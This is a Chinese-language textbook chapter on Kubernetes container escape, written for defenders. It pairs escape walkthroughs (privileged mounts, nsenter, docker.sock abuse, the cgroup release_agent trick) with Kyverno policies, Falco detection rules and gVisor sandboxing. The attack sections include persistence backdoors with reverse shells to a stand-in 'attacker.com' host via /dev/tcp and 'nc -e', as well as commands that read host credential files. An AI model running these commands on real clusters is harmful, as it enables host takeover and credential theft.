# 第14章 专题：容器逃逸深度案例与防御

> **本章目标**：深入分析各类容器逃逸技术的底层原理、完整复现条件和防御策略。容器逃逸是云原生安全中最严重的威胁之一，理解逃逸技术才能建立有效的防御体系。
>
> 读完本章后，你应该能够：理解容器隔离的边界和局限；识别各种逃逸技术的利用条件；部署多层防御体系；使用沙箱容器隔离不可信工作负载。

## 14.1 容器隔离的边界与局限

### 14.1.1 Linux 容器隔离机制回顾

容器通过 Linux 内核的多个机制实现隔离，但每个机制都有其边界：

```
┌─────────────────────────────────────────────────────────────────┐
│                     容器隔离层次                                │
├─────────────────────────────────────────────────────────────────┤
│  Namespaces（命名空间）— 资源视图隔离                           │
│  ├─ mount: 文件系统挂载点隔离                                   │
│  ├─ pid: 进程 ID 空间隔离                                       │
│  ├─ network: 网络设备、端口隔离                                 │
│  ├─ ipc: 进程间通信隔离                                         │
│  ├─ uts: 主机名隔离                                             │
│  ├─ user: 用户/组 ID 隔离                                       │
│  └─ cgroup: 资源限制（不是隔离！）                              │
├─────────────────────────────────────────────────────────────────┤
│  Capabilities（能力）— root 权限细分                            │
│  ├─ 默认 Docker 容器：14 种能力                                 │
│  ├─ 受限容器：cap-drop ALL + 按需添加                           │
│  └─ 特权容器：所有 41 种能力                                    │
├─────────────────────────────────────────────────────────────────┤
│  cgroups（控制组）— 资源限制                                    │
│  ├─ v1: 多个子系统（cpu, memory, blkio 等）                     │
│  ├─ v2: 统一层次结构                                            │
│  └─ 注意：cgroups 只限制资源，不隔离访问！                      │
├─────────────────────────────────────────────────────────────────┤
│  Seccomp — 系统调用过滤                                         │
│  ├─ 默认 Docker：44 个系统调用被禁止                            │
│  ├─ RuntimeDefault：K8s 默认                                    │
│  └─ Unconfined：无限制（危险）                                  │
├─────────────────────────────────────────────────────────────────┤
│  LSM（Linux Security Modules）                                  │
│  ├─ AppArmor: 基于路径的访问控制                                │
│  ├─ SELinux: 基于标签的强制访问控制                             │
│  └─ 提供额外的安全层，但可配置性差异大                            │
└─────────────────────────────────────────────────────────────────┘

关键认知：Namespace 提供视图隔离，但不提供安全隔离！
如果容器获得了足够的 Capabilities 或突破了 Seccomp，隔离就被打破。
```

### 14.1.2 容器逃逸攻击面全景

```
容器逃逸攻击面
    │
    ├─ 特权配置逃逸
    │   ├─ privileged: true（所有能力 + 设备访问）
    │   ├─ hostPID / hostNetwork / hostIPC（命名空间共享）
    │   ├─ 危险卷挂载（/, /proc, /sys, docker.sock, /var/lib/kubelet）
    │   ├─ 过高 Capabilities（SYS_ADMIN, SYS_PTRACE, SYS_MODULE, NET_ADMIN）
    │   └─ 只读根文件系统未启用
    │
    ├─ 内核漏洞逃逸
    │   ├─ Dirty Pipe (CVE-2022-0847)
    │   ├─ Dirty Cow (CVE-2016-5195)
    │   ├─ CVE-2021-3493（OverlayFS）
    │   └─ CVE-2022-0185（File System Context）
    │
    ├─ 运行时组件漏洞
    │   ├─ runc (CVE-2019-5736, CVE-2024-21626)
    │   ├─ containerd (CVE-2024-0132)
    │   └─ Docker（历史漏洞）
    │
    ├─ LSM/Seccomp 绕过
    │   ├─ AppArmor profile 配置错误
    │   ├─ SELinux permissive 模式
    │   └─ Seccomp 过滤不完整
    │
    └─ 信息泄露辅助逃逸
        ├─ /proc 信息泄露（宿主机进程、环境变量）
        ├─ Kernel pointers（/proc/kallsyms）
        └─ 容器编排信息泄露
```

## 14.2 特权配置逃逸详解

### 14.2.1 privileged: true 逃逸

**原理**：特权容器拥有宿主机 root 的所有权限，几乎等同于在宿主机上直接运行。

```
特权容器的特权范围：

┌─────────────────────────────────────────────────────────────┐
│ 特权容器 vs 普通容器                                          │
├─────────────────────────────────────────────────────────────┤
│ 设备访问                                                     │
│ ├─ 特权: /dev/sda, /dev/mem, /dev/kmem（全部可访问）        │
│ └─ 普通: /dev/null, /dev/zero, /dev/random（白名单）        │
├─────────────────────────────────────────────────────────────┤
│ 系统调用                                                     │
│ ├─ 特权: 所有系统调用（包括 mount, mknod, pivot_root）      │
│ └─ 普通: Seccomp 过滤（约 300+ 个调用被限制）               │
├─────────────────────────────────────────────────────────────┤
│ 能力（Capabilities）                                          │
│ ├─ 特权: 所有 41 种能力                                      │
│ └─ 普通: 默认 14 种，可进一步限制                            │
├─────────────────────────────────────────────────────────────┤
│ LSM（AppArmor/SELinux）                                       │
│ ├─ 特权: 通常不受限或受限极弱                                │
│ └─ 普通: 默认 profile（docker-default）                     │
└─────────────────────────────────────────────────────────────┘
```

**逃逸利用**：

```bash
# 进入特权容器
kubectl exec -it privileged-pod -- bash

# 1. 查看宿主机磁盘设备
ls /dev/sd*
# 输出: /dev/sda /dev/sda1 /dev/sda2

# 2. 直接挂载宿主机根目录
mkdir /host-root
mount /dev/sda1 /host-root    # 特权容器可直接挂载块设备
chroot /host-root

# 3. 确认逃逸成功
whoami        # root
hostname      # 宿主机 hostname（不是 Pod 名）
cat /etc/shadow

# 4. 持久化后门
# 方法 A：修改 SSH 公钥
cat /root/.ssh/authorized_keys >> /host-root/root/.ssh/authorized_keys

# 方法 B：写入 crontab
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" \
  >> /host-root/etc/crontab

# 方法 C：创建静态 Pod
# kubelet 会自动执行 /etc/kubernetes/manifests/ 下的 Pod 定义
cat << 'EOF' > /host-root/etc/kubernetes/manifests/backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
spec:
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    command: ["nc", "-e", "/bin/sh", "attacker.com", "4444"]
EOF
```

**防御**：

```yaml
# Pod Security Standards: restricted 级别禁止 privileged
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest

---
# Kyverno 策略
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged
spec:
  validationFailureAction: Enforce
  rules:
  - name: privileged-containers
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Privileged containers are forbidden"
      pattern:
        spec:
          containers:
          - securityContext:
              =(privileged): "false"
```

### 14.2.2 hostPID: true 逃逸

**原理**：Pod 与宿主机共享 PID 命名空间，容器内可以看到并操作宿主机所有进程。

```
hostPID 共享的效果：

普通 Pod 的 PID 命名空间：
PID 1: /bin/sh (容器主进程)
PID 2: nginx worker
PID 3: nginx worker

hostPID=true 的 Pod：
PID 1: /usr/lib/systemd/systemd (宿主机 init!)
PID 2: kthreadd
...
PID 1234: kubelet
PID 5678: containerd
PID 9012: 容器主进程（在宿主机视角中）
```

**利用方式**：

```bash
# 1. 查看宿主机进程
ps aux | head -20
# PID 1 是 systemd，不是容器主进程

# 2. 进入宿主机 init 命名空间
nsenter -t 1 -m -u -i -n -p /bin/bash
# -t 1: 目标 PID 1（宿主机 init）
# -m: 挂载命名空间
# -u: UTS 命名空间
# -i: IPC 命名空间
# -n: 网络命名空间
# -p: PID 命名空间

# 3. 现在你在宿主机 root shell 中
cat /etc/kubernetes/admin.conf  # 获取集群管理员凭证

# 替代方法：通过 /proc 访问
# /proc/<pid>/root/ 指向进程的根文件系统
cat /proc/1/root/etc/shadow
ls /proc/1/root/etc/kubernetes/
```

**防御**：

```yaml
# PSS restricted 禁止 hostPID
apiVersion: v1
kind: Namespace
metadata:
  labels:
    pod-security.kubernetes.io/enforce: restricted
  name: production

---
# Falco 检测规则
- rule: Nsenter Execution
  desc: Detect nsenter command execution (possible escape)
  condition: >
    spawned_process and
    proc.name=nsenter and
    container
  output: >
    Nsenter executed in container
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: CRITICAL
```

### 14.2.3 hostPath 卷挂载逃逸

**危险挂载点分级**：

| 挂载路径 | 风险等级 | 利用方式 | 检测特征 |
|---------|---------|---------|---------|
| `/` | 🔴 极高 | 直接读写所有文件 | mount 包含 `/` |
| `/proc` | 🔴 极高 | 访问宿主机进程、环境变量 | mount 包含 `proc` |
| `/sys` | 🔴 极高 | 修改内核参数、设备 | mount 包含 `sysfs` |
| `/var/run/docker.sock` | 🔴 极高 | Docker API 特权容器启动 | socket 文件访问 |
| `/var/lib/kubelet` | 🔴 极高 | 访问 kubelet 证书、Pod 数据 | kubelet 目录访问 |
| `/etc/kubernetes` | 🔴 极高 | 集群证书、静态 Pod 清单 | 证书文件访问 |
| `/dev` | 🟠 高 | 访问磁盘、内存设备 | 块设备访问 |
| `/var/log` | 🟡 中 | 日志读取（信息泄露） | 日志文件访问 |

**docker.sock 逃逸详解**：

```yaml
# 危险配置
spec:
  containers:
  - name: app
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
```

```bash
# 容器内利用 Docker API
# 1. 安装 Docker CLI（可选，也可以直接用 API）
apk add docker-cli

# 2. 列出宿主机上的容器
docker -H unix:///var/run/docker.sock ps

# 3. 启动特权容器挂载宿主机根目录
docker -H unix:///var/run/docker.sock run \
  --rm -it \
  --privileged \
  -v /:/host \
  ubuntu \
  chroot /host /bin/bash

# 4. 直接获得宿主机 root shell

# 更隐蔽的方法：直接创建新容器而不运行
docker -H unix:///var/run/docker.sock create \
  --name backdoor \
  --restart=always \
  --privileged \
  -v /:/host \
  alpine \
  sh -c "while true; do nc -e /bin/sh attacker.com 4444; sleep 60; done"
docker -H unix:///var/run/docker.sock start backdoor
```

**防御策略**：

```yaml
# Kyverno：禁止 docker.sock 挂载
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-docker-sock
spec:
  validationFailureAction: Enforce
  rules:
  - name: no-docker-sock
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Mounting docker.sock is forbidden"
      pattern:
        spec:
          =(volumes):
          - X(hostPath):
              path: "!/var/run/docker.sock"

---
# 如果必须使用 hostPath，限制为只读
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    volumeMounts:
    - name: host-logs
      mountPath: /host/logs
      readOnly: true    # 只读！
  volumes:
  - name: host-logs
    hostPath:
      path: /var/log
```

### 14.2.4 Capabilities 逃逸

**危险 Capabilities 详解**：

| Capability | 权限说明 | 逃逸方式 | 替代方案 |
|-----------|---------|---------|---------|
| `CAP_SYS_ADMIN` | 执行管理操作 | `unshare` 创建新 NS，`mount` 任意 FS | 不授予，使用特定子能力 |
| `CAP_SYS_PTRACE` | 跟踪/调试进程 | 注入代码到宿主机进程 | 只在调试环境使用 |
| `CAP_SYS_MODULE` | 加载/卸载内核模块 | `insmod` 恶意模块 | 绝不授予 |
| `CAP_DAC_READ_SEARCH` | 绕过文件读权限检查 | 读取任意文件 | 不授予 |
| `CAP_DAC_OVERRIDE` | 绕过文件写权限检查 | 修改任意文件 | 不授予 |
| `CAP_NET_ADMIN` | 网络管理 | 修改网络配置、嗅探 | 使用 CNI 管理网络 |
| `CAP_SYS_RAWIO` | 原始 I/O | 直接读写磁盘块 | 不授予 |
| `CAP_SYS_BOOT` | 重启系统 | `reboot` 宿主机 | 不授予 |
| `CAP_LINUX_IMMUTABLE` | 修改 immutable 属性 | 修改关键文件 | 不授予 |

**CAP_SYS_ADMIN + Cgroup v1 完整逃逸**：

```bash
# 前提：容器有 CAP_SYS_ADMIN（或 --privileged）

# 步骤 1：创建 cgroup 目录
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 步骤 2：启用 release_agent
echo 1 > /tmp/cgrp/x/notify_on_release

# 步骤 3：获取容器在宿主机上的路径
# /etc/mtab 包含 overlay 挂载信息
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "Host path: $host_path"

# 步骤 4：设置 release_agent 路径
# release_agent 在 cgroup 为空时在宿主机上执行
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 步骤 5：写入恶意命令
cat << 'EOF' > /cmd
#!/bin/sh
ps aux > /tmp/pwned_output
EOF
chmod a+x /cmd

# 步骤 6：触发 release_agent（将当前 shell 的 PID 放入 cgroup）
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 当这个 shell 退出时，cgroup 变空
# release_agent 在宿主机上以 root 执行！
```

**Cgroup v2 的差异**：

```
Cgroup v1 vs v2 对逃逸的影响：

Cgroup v1:
├─ 多个独立层次结构
├─ release_agent 特性存在
└─ 更容易利用 cgroup 逃逸

Cgroup v2:
├─ 统一层次结构
├─ release_agent 被移除（不再有自动执行）
├─ 需要 root 在初始用户命名空间
└─ 逃逸难度大幅增加

建议：使用支持 cgroup v2 的容器运行时（containerd 1.7+）
```

## 14.3 内核漏洞逃逸

### 14.3.1 Dirty Pipe (CVE-2022-0847)

**漏洞原理深度分析**：

```
Linux 管道页面机制：

正常管道：
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  写入端      │────▶│  管道页面    │────▶│  读取端      │
│  pipe_write │     │  (只写)     │     │  pipe_read  │
└─────────────┘     └─────────────┘     └─────────────┘

Dirty Pipe 漏洞：
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  splice()   │────▶│  页面被错误  │────▶│  管道页面    │
│  零拷贝     │     │  标记为可写  │     │  (应该只读) │
└─────────────┘     └─────────────┘     └─────────────┘
                                           │
                                           ▼ 写入管道 = 修改原始文件！
                                    ┌─────────────┐
                                    │  任意可读文件 │
                                    │  /etc/passwd │
                                    │  SUID 二进制 │
                                    └─────────────┘
```

**K8s 攻击场景**：

```bash
# 在 Pod 中检查内核版本
uname -r
# 5.8 - 5.16.10 存在漏洞

# 利用 Dirty Pipe 修改 /etc/passwd
# 添加一个无密码的 root 用户
# 然后 su 切换

# 即使容器配置了 readOnlyRootFilesystem
# Dirty Pipe 绕过文件系统层，直接修改页面
```

**防御**：
- 升级内核到修复版本（≥ 5.16.11 / ≥ 5.15.25 / ≥ 5.10.102）
- 使用 gVisor/Kata Containers（拦截系统调用）
- 使用 Distroless 镜像（减少可利用的工具）

### 14.3.2 CVE-2021-3493：OverlayFS 权限提升

**漏洞概述**：
- **影响**：Ubuntu 20.04 / 21.04
- **原理**：OverlayFS 文件系统中，用户命名空间的文件权限验证漏洞

**利用**：
```bash
# 在容器内创建用户命名空间
unshare -Urm

# 利用 OverlayFS 挂载获得 root 权限
# 可以覆盖宿主机上的 SUID 二进制文件
```

**防御**：
- 升级内核
- 禁止 `unshare` 系统调用（Seccomp）
- 使用 gVisor

## 14.4 LSM/Seccomp 绕过

### 14.4.1 AppArmor 配置错误

```bash
# 检查容器 AppArmor profile
docker inspect <container> | grep AppArmor
# 默认：docker-default
# 危险：unconfined

# 查看 docker-default profile
# 它限制了很多操作，但如果被覆盖：
docker run --security-opt apparmor=unconfined ubuntu
# 完全绕过 AppArmor！
```

**K8s 中的 AppArmor**：

```yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    container.apparmor.security.beta.kubernetes.io/nginx: runtime/default
spec:
  containers:
  - name: nginx
    image: nginx
    securityContext:
      seccompProfile:
        type: RuntimeDefault
```

### 14.4.2 Seccomp 绕过

```bash
# 危险：使用 Unconfined Seccomp
docker run --security-opt seccomp=unconfined ubuntu

# K8s 中的危险配置
securityContext:
  seccompProfile:
    type: Unconfined  # 禁用 Seccomp 过滤！
```

**推荐配置**：

```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault  # 使用运行时默认过滤
  capabilities:
    drop:
    - ALL
    add:
    - NET_BIND_SERVICE  # 只添加必需的能力
```

## 14.5 沙箱容器：gVisor、Kata Containers 与 Firecracker

### 14.5.1 gVisor 深度解析

**架构**：

```
应用 → glibc → Sentry（用户空间内核）→ Gofer（文件系统代理）→ 宿主机内核
                │                              │
                ├─ 拦截所有系统调用            ├─ 限制文件访问
                ├─ 独立的网络栈                ├─ 9P 协议通信
                ├─ 内存管理                    └─ 沙箱文件系统
                └─ 进程调度

两种运行模式：
1. KVM 模式：使用硬件虚拟化加速
2. Ptrace 模式：使用 ptrace 拦截系统调用（较慢）
```

**部署**：

```bash
# 安装 gVisor
(
  set -e
  ARCH=$(uname -m)
  URL=https://storage.googleapis.com/gvisor/releases/release/latest
  wget ${URL}/runsc ${URL}/runsc.sha512
  sha512sum -c runsc.sha512
  chmod +x runsc
  sudo mv runsc /usr/local/bin/
)

# 配置 containerd
sudo runsc install
sudo systemctl restart containerd

# K8s RuntimeClass
```

```yaml
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
---
apiVersion: v1
kind: Pod
metadata:
  name: gvisor-app
spec:
  runtimeClassName: gvisor
  containers:
  - name: app
    image: nginx:alpine
```

**gVisor 安全特性**：

| 特性 | 说明 | 保护效果 |
|------|------|---------|
| 系统调用拦截 | Sentry 拦截并重写所有系统调用 | 阻止内核漏洞利用 |
| 独立网络栈 | 不共享宿主机网络栈 | 防止网络层攻击 |
| 有限文件访问 | Gofer 代理所有文件操作 | 限制文件系统逃逸 |
| 内存隔离 | 独立的地址空间管理 | 防止内存攻击 |

**局限性**：
- 部分系统调用不兼容（如某些 ioctls）
- 性能开销 10-50%（取决于工作负载）
- 不适合需要高性能网络的应用

### 14.6.2 Falco 逃逸检测规则集

```yaml
# 特权容器启动检测
- rule: Launch Privileged Container
  desc: Detect privileged container started
  condition: >
    spawned_process and
    container and
    container.privileged=true
  output: >
    Privileged container started
    user=%user.name command=%proc.cmdline
    image=%container.image.repository pod=%k8s.pod.name
  priority: CRITICAL

# nsenter 检测（命名空间切换）
- rule: Nsenter Execution
  desc: Detect nsenter command execution (possible container escape)
  condition: >
    spawned_process and
    proc.name=nsenter and
    container
  output: >
    Nsenter executed in container
    user=%user.name command=%proc.cmdline
    container=%container.name pod=%k8s.pod.name
  priority: CRITICAL

# 宿主机设备访问
- rule: Contact with Host Device
  desc: Detect access to host block devices
  condition: >
    spawned_process and
    (fd.name startswith /dev/sd or
     fd.name startswith /dev/xvd or
     fd.name startswith /dev/nvme)
  output: >
    Host device accessed
    user=%user.name fd=%fd.name
    command=%proc.cmdline
  priority: CRITICAL

# 内核模块加载
- rule: Kernel Module Loaded
  desc: Detect kernel module insertion
  condition: >
    spawned_process and
    (proc.name=insmod or proc.name=modprobe)
  output: >
    Kernel module loaded
    user=%user.name command=%proc.cmdline
  priority: CRITICAL

# unshare 检测
- rule: Unshare Execution
  desc: Detect unshare system call (namespace manipulation)
  condition: >
    spawned_process and
    proc.name=unshare
  output: >
    Unshare executed
    user=%user.name command=%proc.cmdline
  priority: WARNING

# mount 检测
- rule: Suspicious Mount
  desc: Detect suspicious mount operations
  condition: >
    spawned_process and
    proc.name=mount and
    (evt.args contains "/proc" or
     evt.args contains "/sys" or
     evt.args contains "cgroup")
  output: >
    Suspicious mount operation
    user=%user.name command=%proc.cmdline
  priority: WARNING
```

### 14.6.3 OPA/Kyverno 逃逸预防策略

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: prevent-container-escape
spec:
  validationFailureAction: Enforce
  rules:
  # 禁止 privileged
  - name: disallow-privileged
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Privileged containers are forbidden"
      pattern:
        spec:
          containers:
          - securityContext:
              =(privileged): "false"

  # 禁止 hostPID / hostNetwork / hostIPC
  - name: disallow-host-namespaces
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Host namespaces are forbidden"
      pattern:
        spec:
          =(hostPID): "false"
          =(hostNetwork): "false"
          =(hostIPC): "false"

  # 禁止危险 hostPath
  - name: restrict-host-path
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Dangerous hostPath mounts are forbidden"
      pattern:
        spec:
          =(volumes):
          - X(hostPath):
              path: "!/etc/kubernetes*|!/var/run/docker.sock*|!/proc*|!/sys*|!/"

  # 强制 capabilities drop ALL
  - name: require-capabilities-drop
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Containers must drop ALL capabilities"
      pattern:
        spec:
          containers:
          - securityContext:
              capabilities:
                drop:
                - ALL

  # 禁止危险 capabilities
  - name: restrict-dangerous-capabilities
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Dangerous capabilities are forbidden"
      pattern:
        spec:
          containers:
          - securityContext:
              =(capabilities):
                X(add):
                - SYS_ADMIN
                - SYS_PTRACE
                - SYS_MODULE
                - NET_ADMIN
                - SYS_RAWIO

  # 强制 readOnlyRootFilesystem
  - name: require-read-only-root
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "readOnlyRootFilesystem must be true"
      pattern:
        spec:
          containers:
          - securityContext:
              readOnlyRootFilesystem: true

  # 强制 runAsNonRoot
  - name: require-run-as-non-root
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "runAsNonRoot must be true"
      pattern:
        spec:
          securityContext:
            runAsNonRoot: true
```

```python
# security-responder.py - 安全事件自动响应服务
from flask import Flask, request
import kubernetes
import json

app = Flask(__name__)
k8s = kubernetes.client.CoreV1Api()

@app.route('/', methods=['POST'])
def handle_alert():
    alert = request.json
    
    # 只处理高危事件
    if alert.get('priority') not in ['Critical', 'Emergency']:
        return "skipped", 200
    
    # 提取 Pod 信息
    pod_name = alert.get('output_fields', {}).get('k8s.pod.name')
    namespace = alert.get('output_fields', {}).get('k8s.ns.name')
    
    if not pod_name:
        return "no pod info", 400
    
    # 自动响应：隔离 Pod（添加 NetworkPolicy 标签）
    try:
        k8s.patch_namespaced_pod(
            name=pod_name,
            namespace=namespace,
            body={
                "metadata": {
                    "labels": {
                        "security.isolation": "quarantine",
                        "security.alert.id": alert.get('rule')
                    }
                }
            }
        )
        
        # 触发隔离 NetworkPolicy
        # (由 Kyverno 策略自动为 quarantine 标签创建 deny-all)
        
        print(f"[AUTO-RESPONSE] Quarantined pod {namespace}/{pod_name}")
        return "quarantined", 200
    except Exception as e:
        print(f"[ERROR] Failed to quarantine: {e}")
        return "error", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

## 14.9 本章小结

| 逃逸类型 | 前提条件 | 检测方法 | 防御措施 |
|---------|---------|---------|---------|
| 特权容器 | `privileged: true` | Falco 特权容器规则 | PSS restricted、禁止 privileged |
| hostPID | `hostPID: true` | Falco nsenter 检测 | 禁止 hostPID |
| hostPath | 挂载 `/`, `/proc`, docker.sock | 审计卷挂载 | Kyverno 限制 hostPath |
| SYS_ADMIN | `cap-add SYS_ADMIN` | Falco unshare 检测 | `cap-drop ALL` |
| Dirty Pipe | 内核 5.8-5.16 | 内核版本扫描 | 升级内核、gVisor |
| runc 漏洞 | 旧版本 runc | 版本扫描 | 升级 runc |
| cgroup v1 | cgroup v1 + SYS_ADMIN | 行为检测 | 使用 cgroup v2 |

**核心防御原则**：
1. **纵深防御**：多层防护，单层被突破仍有后手
2. **最小权限**：不给容器任何不必要的权限或挂载
3. **默认拒绝**：PSS restricted + NetworkPolicy 默认拒绝
4. **快速检测**：假设逃逸会发生，重点是快速发现和响应
5. **沙箱隔离**：对不可信工作负载使用 gVisor/Kata

**安全配置检查清单**：

```yaml
# 最小安全配置模板
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
```
